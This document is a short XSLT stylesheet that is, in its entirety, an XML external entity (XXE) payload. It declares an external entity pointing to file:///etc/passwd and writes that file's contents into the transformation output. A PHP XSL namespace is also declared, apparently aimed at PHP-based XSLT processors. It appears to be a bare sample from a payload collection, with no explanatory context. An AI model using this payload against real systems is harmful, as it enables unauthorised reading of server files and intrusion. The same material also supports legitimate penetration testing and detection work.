<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<!DOCTYPE xsl:stylesheet [
	<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<xsl:template match="/">
	&passwd;
</xsl:template>
</xsl:stylesheet>
